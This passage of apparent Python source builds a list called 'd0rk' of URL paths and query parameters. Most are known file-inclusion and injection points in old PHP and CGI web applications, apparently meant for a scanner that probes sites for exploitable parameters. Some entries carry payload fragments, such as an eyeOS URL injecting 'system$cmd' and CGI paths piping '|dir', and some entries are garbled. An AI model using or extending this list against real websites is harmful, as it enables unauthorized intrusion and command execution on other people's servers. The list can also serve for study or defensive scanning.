         '/administrator/components/comserverstat/inst.serverstat.php?mosConfigabsolutepathcomserverstat',
         '/administrator/components/comserverstat/install.serverstat.php?mosConfigabsolutepath',
         '/administrator/components/comuhp/uhpconfig.php?mosConfigabsolutepath',
         '/adminmodules/adminmoduledeldir.inc.php?config[pathsrcinclude]',
         '/afb3beta20070828/includes/settings.inc.php?approot', '/agendax/addevent.inc.php?agendaxpath',
         '/akocomments.php?mosConfigabsolutepath', '/albumportal.php?phpbbrootpath', '/alinitialize.php?alpath',
         '/all.php?', '/all.php?PageID',
         '/all.php?REQUEST&REQUEST[option]comcontent&REQUEST[Itemid]1&GLOBALS&mosConfigabsolutepath', '/all.php?S',
         '/all.php?a', '/all.php?abrir', '/all.php?act', '/all.php?action', '/all.php?ad', '/all.php?archive',
         '/all.php?area', '/all.php?article', '/all.php?b', '/all.php?back', '/all.php?base', '/all.php?basedir',
         '/all.php?bbs', '/all.php?boardno', '/all.php?c', '/all.php?caldir', '/all.php?cat', '/all.php?category',
         '/all.php?choice', '/all.php?class', '/all.php?clubid', '/all.php?cod', '/all.php?cod.tipo', '/all.php?conf',
         '/all.php?configFile', '/all.php?cont', '/all.php?corpo', '/all.php?cvsroot', '/all.php?d', '/all.php?da',
         '/all.php?date', '/all.php?debug', '/all.php?debut', '/all.php?default', '/all.php?destino', '/all.php?dir',
         '/all.php?display', '/all.php?east', '/all.php?f', '/all.php?fcontent', '/all.php?file', '/all.php?fileid',
         '/all.php?filepath', '/all.php?flash', '/all.php?folder', '/all.php?for', '/all.php?form',
         '/all.php?formatword', '/all.php?from', '/all.php?funcao', '/all.php?function', '/all.php?g', '/all.php?get',
         '/all.php?go', '/all.php?gorumDir', '/all.php?goto', '/all.php?h', '/all.php?headline', '/all.php?i',
         '/all.php?inc', '/all.php?include', '/all.php?includedir', '/all.php?inter', '/all.php?itemid', '/all.php?j',
         '/all.php?join', '/all.php?jojo', '/all.php?l', '/all.php?la', '/all.php?lan', '/all.php?lang',
         '/all.php?lest', '/all.php?link', '/all.php?load', '/all.php?loc', '/all.php?m', '/all.php?main',
         '/all.php?meio', '/all.php?meio.php', '/all.php?menu', '/all.php?menuID', '/all.php?mep', '/all.php?mid',
         '/all.php?month', '/all.php?mostra', '/all.php?my', '/all.php?n', '/all.php?nav', '/all.php?new',
         '/all.php?news', '/all.php?next', '/all.php?nextpage', '/all.php?o', '/all.php?op', '/all.php?open',
         '/all.php?option', '/all.php?origem', '/all.php?p', '/all.php?pageurl', '/all.php?para', '/all.php?part',
         '/all.php?perm', '/all.php?pg', '/all.php?pid', '/all.php?place', '/all.php?play', '/all.php?plugin',
         '/all.php?pmpath', '/all.php?poll', '/all.php?post', '/all.php?pr', '/all.php?prefix', '/all.php?prefixo',
         '/all.php?q', '/all.php?redirect', '/all.php?ref', '/all.php?refid', '/all.php?regionId', '/all.php?release',
         '/all.php?releaseid', '/all.php?return', '/all.php?root', '/all.php?searchcodeid', '/all.php?sec',
         '/all.php?secao', '/all.php?sect', '/all.php?sel', '/all.php?server', '/all.php?servico', '/all.php?sg',
         '/all.php?shard', '/all.php?show', '/all.php?sid', '/all.php?site', '/all.php?sourcedir', '/all.php?start',
         '/all.php?storyid', '/all.php?str', '/all.php?subd', '/all.php?subdir', '/all.php?subject', '/all.php?sufixo',
         '/all.php?systempath', '/all.php?t', '/all.php?task', '/all.php?teste', '/all.php?themedir',
         '/all.php?threadid', '/all.php?tid', '/all.php?title', '/all.php?to', '/all.php?topicid', '/all.php?type',
         '/all.php?u', '/all.php?url', '/all.php?urlFrom', '/all.php?v', '/all.php?var', '/all.php?vi', '/all.php?view',
         '/all.php?visual', '/all.php?wPage', '/all.php?y', '/all.php?z', '/all.php?zo',
         '/all/include/init.inc.php?CPGMDIR', '/all/includes/mxfunctionsch.php?phpbbrootpath',
         '/all/modules/AllMyGuests/signin.php?AMGconfig[cfgserverpath]', '/all/newbb/print.php?forumtopicid',
         '/all/newbbplus/', '/all/news/archive.php?opyearmonth',
         '/all/tsep/include/colorswitch.php?tsepconfig[absPath]', '/allPackages.php?sourcedir',
         '/alladdedit.php?rootdir', '/alladdevent.inc.php?agendaxpath', '/alladmin.php?caldir', '/allaffich.php?base',
         '/allalbumportal.php?phpbbrootpath', '/allcomextendedregistration', '/allcontacts.php?caldir',
         '/allconvertdate.php?caldir', '/alldefault.php?page', '/alldefault/theme.php?THEMEDIR',
         '/alldisplayCategory.php?basepath', '/alleditor.php?root', '/allexibir.php?abre', '/allexibir.php?get',
         '/allexibir.php?lang', '/allexibir.php?p', '/allexibir.php?page', ]
d0rk += ['/allexpanded.php?conf', '/allfunctions.php?prefix', '/allgrademade/index.php?page',
         '/allheader.php?systempath', '/allinclude.php?gorumDir', '/allindex.php?a', '/allindex.php?acao',
         '/allindex.php?action', '/allindex.php?b', '/allindex.php?c', '/allindex.php?cal', '/allindex.php?configFile',
         '/allindex.php?d', '/allindex.php?directfile', '/allindex.php?e', '/allindex.php?f', '/allindex.php?funcion',
         '/allindex.php?g', '/allindex.php?gorumdir', '/allindex.php?h', '/allindex.php?i', '/allindex.php?include',
         '/allindex.php?ir', '/allindex.php?j', '/allindex.php?k', '/allindex.php?l', '/allindex.php?ll',
         '/allindex.php?lng./../include/main.inc&GPATH', '/allindex.php?lnk', '/allindex.php?loc', '/allindex.php?lv1',
         '/allindex.php?m', '/allindex.php?meio.php', '/allindex.php?middle', '/allindex.php?n', '/allindex.php?o',
         '/allindex.php?open', '/allindex.php?p', '/allindex.php?page', '/allindex.php?pageurl', '/allindex.php?path',
         '/allindex.php?pg', '/allindex.php?prefix', '/allindex.php?q', '/allindex.php?r', '/allindex.php?rootPATH',
         '/allindex.php?s', '/allindex.php?secao', '/allindex.php?seite', '/allindex.php?server', '/allindex.php?sub',
         '/allindex.php?sub2', '/allindex.php?t', '/allindex.php?theme', '/allindex.php?u', '/allindex.php?v',
         '/allindex.php?visualizar', '/allindex.php?x', '/allindex.php?y', '/allindex.php?z', '/allindex2.php?',
         '/allindex2.php?a', '/allindex2.php?acao', '/allindex2.php?b', '/allindex2.php?c', '/allindex2.php?cal',
         '/allindex2.php?cont', '/allindex2.php?content', '/allindex2.php?d', '/allindex2.php?directfile',
         '/allindex2.php?e', '/allindex2.php?f', '/allindex2.php?funcion', '/allindex2.php?g',
         '/allindex2.php?gorumdir', '/allindex2.php?h', '/allindex2.php?i', '/allindex2.php?j', '/allindex2.php?k',
         '/allindex2.php?l', '/allindex2.php?lang', '/allindex2.php?ll', '/allindex2.php?lnk', '/allindex2.php?lv1',
         '/allindex2.php?m', '/allindex2.php?n', '/allindex2.php?o', '/allindex2.php?p', '/allindex2.php?pag',
         '/allindex2.php?path', '/allindex2.php?pg', '/allindex2.php?prefix', '/allindex2.php?q', '/allindex2.php?r',
         '/allindex2.php?rootPATH', '/allindex2.php?s', '/allindex2.php?server', '/allindex2.php?sub',
         '/allindex2.php?sub2', '/allindex2.php?t', '/allindex2.php?theme', '/allindex2.php?u', '/allindex2.php?v',
         '/allindex2.php?x', '/allindex2.php?y', '/allindex2.php?z', '/allindex2php?aa', '/allindex3php?aa',
         '/allindex5.php?', '/allindex5.php?cat', '/allindex5.php?configFile', '/allindex5.php?cont',
         '/allindex5.php?content', '/allindex5.php?do', '/allindex5.php?inc', '/allindex5.php?include',
         '/allindex5.php?lang', '/allindex5.php?lv1', '/allindex5.php?m', '/allindex5.php?main', '/allindex5.php?open',
         '/allindex5.php?p', '/allindex5.php?pag', '/allindex5.php?page', '/allindex5.php?pagina', '/allindex5.php?pg',
         '/allindex5.php?root', '/allindex5.php?site', '/allindex5.php?visualizar', '/allindex5.php?x',
         '/allindextable.php?rootdir', '/allinit.inc.php?CPGMDIR', '/allinit.php?HTTPPOSTVARS',
         '/allinitdb.php?absolutepath', '/alllib.inc.php?pmpath', '/alllib.php?root', '/allmain.php?page',
         '/allmain.php?x', '/allmainfile.php?MAINPATH', '/allmodmainmenu.php?mosConfigabsolutepath',
         '/allmoduledb.php?pivotpath', '/allmylinks/include/footer.inc.php?AMLconfig[cfgserverpath]',
         '/allmylinks/include/info.inc.php?AMVconfig[cfgserverpath]', '/allnewvisitor.inc.php?lvcincludedir',
         '/allphpshop/index.php?basedir', '/allpipe.php?HCLpath', '/allsecureimgrender.php?p',
         '/allstartlobby.php?CONFIG[MWCHATLibs]', '/allstepone.php?serverinc', '/allsteponetables.php?serverinc',
         '/alltemplate.php?pagina', '/alltheme.php?THEMEDIR', '/allupgradealbum.php?GALLERYBASEDIR',
         '/allview.php?rootdir', '/allviewgantt.php?rootdir', '/allvwfiles.php?rootdir', '/allwrite.php?dir',
         '/amember/plugins/payment/linkpoint/linkpoint.inc.php?config[rootdir]', '/announcements.php?phpraiddir',
         '/app/common/lib/codeBeautifier/Beautifier/Core.php?BEAUTPATH',
         '/app/editor/login.cgi?user&commandsimple&doedit&password&file', '/application.php?basepath',
         '/apps/apps.php?app', '/appserv/main.php?appservroot', '/archive.php?CONFIG[scriptpath]', '/arg.php?arg',
         '/args.php?arg', '/arquivo.php?data', '/article.php?sid', '/articles.cgi?a34&t',
         '/ashheadlines.php?pathtoashnews', '/ashnews.php?pathtoashnews', '/atom.php5?page', '/auktion.pl?menue',
         '/auto.php?inc', '/auto.php?page', '/avatar.php?page', '/axs/axadmin.pls?ri?t', '/axs/axadmin.plscript',
         '/b2tools/gm2b2.php?b2inc', '/base.php?', '/base.php?[]', '/base.php?abre', '/base.php?adresa',
         '/base.php?basedir', '/base.php?basepath', '/base.php?category', '/base.php?chapter', '/base.php?choix',
         '/base.php?cont', '/base.php?disp', '/base.php?doshow', '/base.php?ev', '/base.php?eval', '/base.php?f1',
         '/base.php?filepath', '/base.php?home', '/base.php?id', '/base.php?incl', '/base.php?include', '/base.php?ir',
         '/base.php?itemnav', '/base.php?k', '/base.php?ki', '/base.php?l', '/base.php?lang', '/base.php?link',
         '/base.php?loc', '/base.php?mid', '/base.php?middle', '/base.php?middlePart', '/base.php?module',
         '/base.php?numero', '/base.php?o', '/base.php?oldal', '/base.php?opcion', ]
d0rk += ['/base.php?p', '/base.php?pa', '/base.php?pag', '/base.php?page', '/base.php?panel', '/base.php?path',
         '/base.php?phpbbrootpath', '/base.php?play', '/base.php?rub', '/base.php?seccion', '/base.php?second',
         '/base.php?seite', '/base.php?sekce', '/base.php?sivu', '/base.php?str', '/base.php?subject', '/base.php?t',
         '/base.php?to', '/base.php?v', '/base.php?var', '/base.php?w', '/bblib/checkdb.inc.php?libpach',
         '/bbusagestats/include/bbusagestats.php?phpbbrootpath', '/beacon//1/splash.lang.php?Path',
         '/becommunity/community/index.php?pageurl', '/big.php?pathtotemplate', '/biznews.cgi?a33&t', '/blank.php?',
         '/blank.php?OpenPage', '/blank.php?abre', '/blank.php?action', '/blank.php?basedir', '/blank.php?basepath',
         '/blank.php?category', '/blank.php?channel', '/blank.php?corpo', '/blank.php?destino', '/blank.php?dir',
         '/blank.php?filepath', '/blank.php?get', '/blank.php?goFile', '/blank.php?goto', '/blank.php?h',
         '/blank.php?header', '/blank.php?id', '/blank.php?in', '/blank.php?incl', '/blank.php?ir',
         '/blank.php?itemnav', '/blank.php?j', '/blank.php?ki', '/blank.php?lang', '/blank.php?left', '/blank.php?link',
         '/blank.php?loader', '/blank.php?menu', '/blank.php?mod', '/blank.php?o', '/blank.php?oldal',
         '/blank.php?open', '/blank.php?p', '/blank.php?pa', '/blank.php?page', '/blank.php?pagina', '/blank.php?panel',
         '/blank.php?path', '/blank.php?phpbbrootpath', '/blank.php?poll', '/blank.php?pr', '/blank.php?pre',
         '/blank.php?pref', '/blank.php?qry', '/blank.php?read', '/blank.php?ref', '/blank.php?rub',
         '/blank.php?section', '/blank.php?sivu', '/blank.php?sp', '/blank.php?strona', '/blank.php?subject',
         '/blank.php?t', '/blank.php?url', '/blank.php?var', '/blank.php?where', '/blank.php?xlink', '/blank.php?z',
         '/board.php?see', '/book.php5?page', '/bz/squito/photolist.inc.php?photoroot', '/calendar.php?l',
         '/calendar.php?lcalendar.php?l', '/calendar.php?p', '/calendar.php?pcalendar.php?p', '/calendar.php?pg',
         '/calendar.php?pgcalendar.php?pg', '/calendar.php?s', '/calendar.php?scalendar.php?s',
         '/calendar.pl?commandlogin&fromTemplate', '/canal.php?meio', '/catalog.nsfcatalog', '/ccbill/whereami.cgi?gls',
         '/cgibin/1/cmd.cgi', '/cgibin/Cgitest.exe', '/cgibin/Count.cgi', '/cgibin/FormHandler.cgi', '/cgibin/GW5',
         '/cgibin/GWWEB.EXE', '/cgibin/LWGate.cgi', '/cgibin/MachineInfo', '/cgibin/acart/acart.pl?&page',
         '/cgibin/awstats.pl?update1&logfile', '/cgibin/awstats/awstats.pl?configdir', '/cgibin/axs.cgi',
         '/cgibin/bash', '/cgibin/bbhist.sh', '/cgibin/bbs/read.cgi?file', '/cgibin/bigconf.cgi', '/cgibin/bnbform',
         '/cgibin/bnbform.cgi', '/cgibin/bp/bplib.pl?g', '/cgibin/cachemgr.cgi', '/cgibin/calendar', '/cgibin/campas',
         '/cgibin/carbo.dll', '/cgibin/cgimail.exe', '/cgibin/cgiwrap', '/cgibin/classified.cgi', '/cgibin/classifieds',
         '/cgibin/classifieds.cgi', '/cgibin/csh', '/cgibin/date', '/cgibin/day5datacopier.cgi', '/cgibin/day5notifier',
         '/cgibin/dbmlparser.exe', '/cgibin/download.cgi', '/cgibin/dumpenv.pl', '/cgibin/edit.pl',
         '/cgibin/environ.cgi', '/cgibin/excite', '/cgibin/faxsurvey', '/cgibin/filemail', '/cgibin/filemail.pl',
         '/cgibin/files.pl', '/cgibin/finger', '/cgibin/finger.cgi', '/cgibin/finger.pl',
         '/cgibin/finger?Enteraccount|host|user|username', '/cgibin/finger?Inreallife', '/cgibin/flexform',
         '/cgibin/flexform.cgi', '/cgibin/formmail.pl', '/cgibin/fortune', '/cgibin/fpexplorer.exe',
         '/cgibin/get32.exe|dir', '/cgibin/glimpse', '/cgibin/guestbook.cgi', '/cgibin/guestbook.pl', '/cgibin/handler',
         '/cgibin/handler.cgi', '/cgibin/hinsts.pl?', '/cgibin/htmlscript', '/cgibin/ikonboard.cgi',
         '/cgibin/index.cgi?page', '/cgibin/info2', '/cgibin/input.bat', '/cgibin/input2.bat',
         '/cgibin/jammail.pl?jobshowoldmail&mail', '/cgibin/jj', '/cgibin/ksh', '/cgibin/lwgate', '/cgibin/mail',
         '/cgibin/maillist.pl', '/cgibin/man.sh', '/cgibin/mlog.phtml', '/cgibin/mylog.phtml', '/cgibin/nlogsmb.pl',
         '/cgibin/npherror.pl', '/cgibin/nphpublish', '/cgibin/nphtestcgi', '/cgibin/pass.txt', '/cgibin/passwd',
         '/cgibin/passwd.txt', '/cgibin/password', '/cgibin/password.txt', '/cgibin/perl', '/cgibin/perl.exe',
         '/cgibin/perlshop.cgi', '/cgibin/pfdispaly.cgi', '/cgibin/phf', '/cgibin/phf.pp', '/cgibin/php',
         '/cgibin/php.cgi', '/cgibin/phpscan', '/cgibin/postquery', '/cgibin/ppdscgi.exe', '/cgibin/probe.cgi?olddat',
         '/cgibin/query', '/cgibin/quikstore.cgi?category', '/cgibin/redirect', '/cgibin/responder.cgi',
         '/cgibin/rguest.exe', '/cgibin/rksh', '/cgibin/rsh', '/cgibin/rshell.pl', '/cgibin/sam.', '/cgibin/search.cgi',
         '/cgibin/search97.vts', '/cgibin/sendform.cgi', '/cgibin/sh', '/cgibin/snorkerz.bat', '/cgibin/snorkerz.cmd',
         '/cgibin/sqwebmail?noframes1', '/cgibin/status.cgi', '/cgibin/survey', '/cgibin/survey.cgi', '/cgibin/tcsh',
         '/cgibin/telnet.cgi', '/cgibin/test.bat', '/cgibin/testcgi', '/cgibin/testcgi.tcl', '/cgibin/testenv',
         '/cgibin/textcounter.pl', '/cgibin/tst.bat', '/cgibin/tst.bat|dir', '/cgibin/ubb/ubb.cgi?g', '/cgibin/unlg1.1',
         '/cgibin/upload.pl', '/cgibin/uptime', '/cgibin/viewsource', '/cgibin/visadmin.exe', '/cgibin/visitor.exe',
         '/cgibin/w3msql', '/cgibin/w3sql', '/cgibin/w3tvars.pm', '/cgibin/wais.pl', ]
d0rk += ['/cgibin/webdist.cgi', '/cgibin/webgais', '/cgibin/webmap.cgi', '/cgibin/websendmail', '/cgibin/wguest.exe',
         '/cgibin/whoisraw.cgi', '/cgibin/wrap', '/cgibin/admin.pl', '/cgibin/board.pl', '/cgibin/sql', '/cgibin/zsh',
         '/cgidos/args.bat', '/cgidos/args.cmd', '/cgishl/wincsample.exe', '/cgisys/guestbook.cgi?usercpanel&template',
         '/cgiwin/uploader.exe', '/chat/inc/cmses/aedating4CMS.php?dir[inc]',
         '/claroline/inc/claroinitheader.inc.php?includePath', '/class.mysql.php?pathtobtdir', '/classes.php?LOCALPATH',
         '/classes/adodbt/sql.php?classesdir', '/classes/adodbt/sql.php?classesdir/classes/adodbt/sql.php?classesdir',
         '/classes/adodbt/sql.php?classesdiradobt', '/classes/adodbt/sql.php?classesdirindex2.php?optionrss',
         '/classes/core/.php?rootdir', '/classifiedright.php?dir', '/classifiedright.php?languagedir',
         '/classifiedright.php?languagedirclassified.php', '/classifiedright.php?languagedirclassified.phpphpbazar',
         '/classifiedright.php?languagedirphpbazar', '/cmd.php?arg', '/codebb/langselect?phpbbrootpath',
         '/codebb/langselect?phpbbrootpathcodebb', '/codebb/langselect?phpbbrootpathcodebb1.1b3',
         '/coinincludes/constants.php?CCFG[PKGPATHINCL]', '/coinincludes/constants.php?CCFG[PKGPATHINCL]phpCOIN',
         '/coinincludes/constants.php?CCFG[PKGPATHINCL]phpCOIN1.2.3',
         '/coinincludes/constants.php?CCFG[PKGPATHINCL]poweredbyphpCOIN1.2.3', '/common.php?includepath',
         '/common/func.php?CommonAbsDir', '/components/comartlinks/artlinks.dispnew.php?mosConfigabsolutepath',
         '/components/comcolorlab/admin.color.php?mosConfiglivesite',
         '/components/comcpg/cpg.php?mosConfigabsolutepath', '/components/comcpg/cpg.php?mosConfigabsolutepathcomcpg',
         '/components/comextcalendar/adminevents.php?CONFIGEXT[LANGUAGESDIR]comextcalendar',
         '/components/comextcalendar/adminevents.php?CONFIGEXT[SDIR]',
         '/components/comextendedregistration/registrationdetailed.inc.php?mosConfigabsolutepath',
         '/components/comextendedregistration/registrationdetailed.inc.php?mosConfigabsolutepathcomextendedregistration',
         '/components/comfacileforms/facileforms.frame.php?ffcompath',
         '/components/comfacileforms/facileforms.frame.php?ffcompathcomfacileforms',
         '/components/comforum/download.php?phpbbrootpath', '/components/comforum/download.php?phpbbrootpathcomforum',
         '/components/comgalleria/galleria.html.php?mosConfigabsolutepath',
         '/components/commp3allopass/allopass.php?mosConfiglivesite',
         '/components/commp3allopass/allopasserror.php?mosConfiglivesite',
         '/components/commtree/Savant2/Savant2Pluginarea.php?mosConfigabsolutepath',
         '/components/commtree/Savant2/Savant2Pluginstylesheet.php?mosConfigabsolutepath',
         '/components/commtree/Savant2/Savant2Plugintextarea.php?mosConfigabsolutepath',
         '/components/comperforms/performs.php?mosConfigabsolutepath',
         '/components/comphpshop/toolbar.phpshop.html.php?mosConfigabsolutepath',
         '/components/comrsgallery/rsgallery.html.php?mosConfigabsolutepath',
         '/components/comrsgery/rsgery.html.php?mosConfigabsolutepath',
         '/components/comsimpleboard/imageupload.php?sbp',
         '/components/comsimpleboard/imageupload.php?sbpcomsimpleboard',
         '/components/comsmf/smf.php?mosConfigabsolutepath',
         '/components/comzoom/includes/database.php?mosConfigabsolutepath',
         '/components/comzoom/includes/database.php?mosConfigabsolutepathcomzoom',
         '/components/comzoom/includes/database.php?mosConfigabsolutepathindex.php?optioncomzoom',
         '/config.inc.php?path', '/config.inc.php?pathescape', '/config.php?fpath', '/config.php?pathtoroot',
         '/config.php?xcartdir', '/contacts.php?caldir', '/contenido.php?sec', '/contenido/classes/class.inuse.php',
         '/content.php?inc', '/content.php?page', '/content.php?seite', '/content/article.php?ide',
         '/content/modifygo.php?pwfile', '/contrib/mxglancesdesc.php?mxrootpath', '/contrib/yabbse/poc.php?pocrootpath',
         '/convert/mvcw.php?step1&vwarroot', '/convert/mvcw.php?vwarroot', '/convertdate.php?caldir',
         '/coollogs/mlog.html', '/coollogs/mylog.html', '/coppercop/theme.php?THEMEDIR',
         '/coppermine/themes/maze/theme.php?THEMEDIR', '/counter/index.phpPHPCounter7.',
         '/cpcommerce/functions.php?prefix', '/cricket/grapher.cgi', '/csvdb/csvdb.cgi?fil',
         '/customer/product.php?xcartdir', '/cyberfolio/portfolio/msg/view.php?av', '/danana/auth/welcome.html',
         '/data/compatible.php?module', '/database.nsf', '/database.php?mosConfigabsolutepath', '/db.php?pathlocal',
         '/db/main.mdb', '/dbase.php?action', '/dbmodules/DBadodb.class.php?PHPOFINCLUDEPATH', '/default.php?',
         '/default.php?abre', '/default.php?arquivo', '/default.php?basedir', '/default.php?basepath',
         '/default.php?channel', '/default.php?chapter', '/default.php?choix', '/default.php?cmd', '/default.php?cont',
         '/default.php?destino', '/default.php?e', '/default.php?eval', '/default.php?f', '/default.php?goto',
         '/default.php?header', '/default.php?id', '/default.php?inc', '/default.php?incl', '/default.php?include',
         '/default.php?index', '/default.php?ir', '/default.php?itemnav', '/default.php?k', '/default.php?ki',
         '/default.php?l', '/default.php?left', '/default.php?load', '/default.php?loader', '/default.php?loc',
         '/default.php?m', '/default.php?menu', '/default.php?menue', ]
d0rk += ['/default.php?mid', '/default.php?mod', '/default.php?module', '/default.php?n', '/default.php?nivel',
         '/default.php?oldal', '/default.php?opcion', '/default.php?option', '/default.php?p', '/default.php?pa',
         '/default.php?pag', '/default.php?page', '/default.php?pagehome', '/default.php?panel', '/default.php?param',
         '/default.php?play', '/default.php?pr', '/default.php?pre', '/default.php?read', '/default.php?ref',
         '/default.php?root', '/default.php?rub', '/default.php?secao', '/default.php?secc', '/default.php?seccion',
         '/default.php?seite', '/default.php?showpage', '/default.php?sivu', '/default.php?sp', '/default.php?str',
         '/default.php?strona', '/default.php?t', '/default.php?thispage', '/default.php?tipo', '/default.php?to',
         '/default.php?type', '/default.php?v', '/default.php?var', '/default.php?vis', '/default.php?x',
         '/default.php?y', '/define.php?term', '/demo/includes/init.php?userinc', '/deportes.cgi?alatest&t',
         '/dernierscommentaires.php?rep', '/detail.php?prod', '/details.php?loc',
         '/dfdcart/app.lib/product.control/core.php/customer.area/customer.browse.list.php?setdepth',
         '/dfdcart/app.lib/product.control/core.php/customer.area/customer.browse.search.php?setdepth',
         '/dfdcart/app.lib/product.control/core.php/product.control.config.php?setdepth', '/direct.php?loc',
         '/directions.php?loc', '/display.php?f', '/display.php?file', '/display.php?l', '/display.php?lang',
         '/display.php?ln', '/display.php?p', '/display.php?pag', '/display.php?page&lang', '/display.php?page',
         '/display.php?pg', '/display.php?s', '/display.php?table', '/domcfg.nsf', '/domlog.nsf',
         '/dotproject/modules/files/indextable.php?rootdir', '/dotproject/modules/projects/addedit.php?rootdir',
         '/dotproject/modules/projects/view.php?rootdir', '/dotproject/modules/projects/vwfiles.php?rootdir',
         '/dotproject/modules/tasks/addedit.php?rootdir', '/dotproject/modules/tasks/viewgantt.php?rootdir',
         '/down.php?OpenPage', '/down.php?action', '/down.php?addr', '/down.php?channel', '/down.php?choix',
         '/down.php?cmd', '/down.php?corpo', '/down.php?disp', '/down.php?doshow', '/down.php?ev', '/down.php?filepath',
         '/down.php?goFile', '/down.php?home', '/down.php?in', '/down.php?inc', '/down.php?incl', '/down.php?include',
         '/down.php?ir', '/down.php?lang', '/down.php?left', '/down.php?nivel', '/down.php?o', '/down.php?oldal',
         '/down.php?open', '/down.php?pa', '/down.php?pag', '/down.php?page', '/down.php?param', '/down.php?path',
         '/down.php?pg', '/down.php?phpbbrootpath', '/down.php?poll', '/down.php?pr', '/down.php?pre', '/down.php?qry',
         '/down.php?r', '/down.php?read', '/down.php?s', '/down.php?second', '/down.php?section', '/down.php?seite',
         '/down.php?showpage', '/down.php?sp', '/down.php?strona', '/down.php?subject', '/down.php?t', '/down.php?to',
         '/down.php?u', '/down.php?url', '/down.php?v', '/down.php?where', '/down.php?x', '/down.php?z',
         '/download.php?sub', '/drupal/?menu[callbacks][1][callback]', '/e107/e107handlers/secureimgrender.php?p',
         '/eblog/blog.inc.php?xoopsConfig[xoopsurl]', '/embed/day.php?path', '/embed/day.php?pathCalendar',
         '/embed/day.php?pathLogintoCalendar', '/embed/day.php?pathWebCalendar', '/emsgb/easymsgb.pl?print',
         '/enc/content.php?HomePath', '/encapscmsPATH/core/core.php?root',
         '/encore/forumcgi/display.cgi?preftemptemp&pageanonymous&file', '/eng.php?img', '/enter.php?', '/enter.php?a',
         '/enter.php?abre', '/enter.php?addr', '/enter.php?b', '/enter.php?basedir', '/enter.php?chapter',
         '/enter.php?cmd', '/enter.php?content', '/enter.php?e', '/enter.php?ev', '/enter.php?get', '/enter.php?go',
         '/enter.php?goto', '/enter.php?home', '/enter.php?id', '/enter.php?incl', '/enter.php?include',
         '/enter.php?index', '/enter.php?ir', '/enter.php?itemnav', '/enter.php?lang', '/enter.php?left',
         '/enter.php?link', '/enter.php?loader', '/enter.php?menue', '/enter.php?mid', '/enter.php?middle',
         '/enter.php?mod', '/enter.php?module', '/enter.php?numero', '/enter.php?o', '/enter.php?open', '/enter.php?p',
         '/enter.php?pa', '/enter.php?page', '/enter.php?pagina', '/enter.php?panel', '/enter.php?path',
         '/enter.php?pg', '/enter.php?phpbbrootpath', '/enter.php?play', '/enter.php?pr', '/enter.php?pref',
         '/enter.php?qry', '/enter.php?r', '/enter.php?read', '/enter.php?ref', '/enter.php?s', '/enter.php?sec',
         '/enter.php?second', '/enter.php?seite', '/enter.php?sivu', '/enter.php?sp', '/enter.php?start',
         '/enter.php?str', '/enter.php?strona', '/enter.php?subject', '/enter.php?thispage', '/enter.php?type',
         '/enter.php?viewpage', '/enter.php?w', '/enter.php?y', '/environment.php?DIRPREFIX', '/eprise/',
         '/es/index.php?action', '/escustommenu.php?filesdir', '/esdesp.php?filesdir', '/esoffer.php?filesdir',
         '/esupport/admin/autoclose.php?subd', '/events.cgi?a155&t', '/events.cgi?t', '/exibir.php?arquivo',
         '/exibir.php?arquivophp?arquivo', '/experts.php?sub', '/extensions/moblog/mobloglib.php?basedir',
         '/extras/extcats.php?dirpath',
         '/eyeos/desktop.php?baccioeyeOptions.eyeapp&aeyeOptions.eyeapp&SESSION%5busr%5droot&SESSION%5bapps%5d%5beyeOptions.eyeapp%5d%5bwrapup%5dinclude$GET%5ba%5d;&a', ]
d0rk += [
	'/eyeos/desktop.php?baccioeyeOptions.eyeapp&aeyeOptions.eyeapp&SESSION%5busr%5droot&SESSION%5bapps%5d%5beyeOptions.eyeapp%5d%5bwrapup%5dsystem$cmd;&cmdid',
	'/fid17013034EFB2509745A39CD861F4FEA3E716FBE5.aspx?s', '/file.php?', '/file.php?action', '/file.php?basepath',
	'/file.php?channel', '/file.php?chapter', '/file.php?choix', '/file.php?cmd', '/file.php?cont', '/file.php?corpo',
	'/file.php?disp', '/file.php?doshow', '/file.php?ev', '/file.php?eval', '/file.php?get', '/file.php?id',
	'/file.php?inc', '/file.php?incl', '/file.php?include', '/file.php?index', '/file.php?ir', '/file.php?ki',
	'/file.php?left', '/file.php?load', '/file.php?loader', '/file.php?middle', '/file.php?modo', '/file.php?n',
	'/file.php?nivel', '/file.php?numero', '/file.php?o', '/file.php?oldal', '/file.php?pagina', '/file.php?param',
	'/file.php?pg', '/file.php?play', '/file.php?poll', '/file.php?pref', '/file.php?q', '/file.php?qry',
	'/file.php?ref', '/file.php?seccion', '/file.php?second', '/file.php?showpage', '/file.php?sivu', '/file.php?sp',
	'/file.php?start', '/file.php?strona', '/file.php?to', '/file.php?type', '/file.php?url', '/file.php?var',
	'/file.php?viewpage', '/file.php?where', '/file.php?y', '/fileseek.cgi?head&foot', '/folder.php?id',
	'/forum.php?act', '/forum.php?seite', '/forum/admin/index.php?incconf', '/forum/forum.php?view',
	'/forum/inst.php?phpbbrootdir', '/forum/install.php?phpbbrootdir', '/frag.php?exec', '/frame.php?loc',
	'/functions.php?includepath', '/functions.php?prefix', '/galerie.php?do', '/gallery.php?', '/gallery.php?[]',
	'/gallery.php?abre', '/gallery.php?action', '/gallery.php?addr', '/gallery.php?basedir', '/gallery.php?basepath',
	'/gallery.php?chapter', '/gallery.php?cont', '/gallery.php?corpo', '/gallery.php?disp', '/gallery.php?ev',
	'/gallery.php?eval', '/gallery.php?filepath', '/gallery.php?get', '/gallery.php?go', '/gallery.php?h',
	'/gallery.php?id', '/gallery.php?index', '/gallery.php?itemnav', '/gallery.php?ki', '/gallery.php?left',
	'/gallery.php?loader', '/gallery.php?menu', '/gallery.php?menue', '/gallery.php?mid', '/gallery.php?mod',
	'/gallery.php?module', '/gallery.php?my', '/gallery.php?nivel', '/gallery.php?oldal', '/gallery.php?open',
	'/gallery.php?option', '/gallery.php?p', '/gallery.php?pag', '/gallery.php?page', '/gallery.php?panel',
	'/gallery.php?param', '/gallery.php?pg', '/gallery.php?phpbbrootpath', '/gallery.php?poll', '/gallery.php?pre',
	'/gallery.php?pref', '/gallery.php?qry', '/gallery.php?redirect', '/gallery.php?ref', '/gallery.php?rub',
	'/gallery.php?sec', '/gallery.php?secao', '/gallery.php?seccion', '/gallery.php?seite', '/gallery.php?showpage',
	'/gallery.php?sivu', '/gallery.php?sp', '/gallery.php?strona', '/gallery.php?thispage', '/gallery.php?tipo',
	'/gallery.php?to', '/gallery.php?url', '/gallery.php?var', '/gallery.php?viewpage', '/gallery.php?where',
	'/gallery.php?xlink', '/gallery.php?y', '/gallery/init.php?HTTPPOSTVARS', '/general.php?', '/general.php?abre',
